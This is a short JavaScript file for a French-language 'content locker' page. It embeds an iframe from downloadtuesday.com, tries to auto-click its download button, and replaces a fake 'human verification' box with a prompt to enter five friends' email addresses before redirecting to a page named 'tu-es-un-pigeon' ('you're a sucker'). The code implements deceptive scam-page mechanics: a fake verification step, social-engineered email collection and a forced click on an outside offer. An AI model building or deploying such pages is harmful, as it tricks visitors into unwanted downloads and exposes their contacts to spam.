var lockerurl =
"http://downloadtuesday.com/685146";


function ogSetContents() {

    jQuery("#locker_button_offers").html('');
    var body = document.getElementsByTagName('body')[0];

    var iframe = document.createElement('iframe');
    iframe.name = 'iframe';
    iframe.scrolling = 'yes';
    iframe.frameborder = '0';
    iframe.style.border = 'none';
    iframe.style.maxWidth = '100%';
    iframe.style.position = 'relative';
    iframe.id = 'offers_iframe';
    iframe.src=lockerurl;

   document.getElementById("locker_button_offers").appendChild(iframe);

    jQuery("#offers_iframe").contents("button.dl_button").click();


}
function ogSetContents2() {

    $(".human-verification-inner-wrapper h3").html('Validation')
    $(".human-verification-inner-wrapper span").html('Pour permettre à tous tes copains de profiter du cette offre tant qu\'il est encore temps, ajoute leur email:')

    $(".human-verification-inner-wrapper div.test").html('<ul>\n' +
      '                                    <li><label style="color: black">email 1:&nbsp;&nbsp; </label><input style="color: black" type="text"/></li>\n' +
      '                                    <li><label style="color: black">email 2:&nbsp;&nbsp; </label><input style="color: black" type="text"/></li>\n' +
      '                                    <li><label style="color: black">email 3:&nbsp;&nbsp; </label><input style="color: black" type="text"/></li>\n' +
      '                                    <li><label style="color: black">email 4:&nbsp;&nbsp; </label><input style="color: black" type="text"/></li>\n' +
      '                                    <li><label style="color: black">email 5:&nbsp;&nbsp; </label><input style="color: black" type="text"/></li>\n' +
      '                                </ul>');

    $(".human-verification-inner-wrapper #human-verification-button").html('<a style="cursor: pointer;" onclick="end();">\n' +
      '                                    <div class="button-inner-wrapper">\n' +
      '                                        <button class="button-generator" type="button" role="button">Valider\n' +
      '                                        </button>\n' +
      '                                    </div>\n' +
      '                                </a>');
    //$(".human-verification-wrapper").hide();
    //$(".end-step-wrapper").show();


}



function end(options) {
    window.location.href = "/tu-es-un-pigeon.html"
    console.log('end');
}
function call_locker(options) {
    ogSetContents2();
}
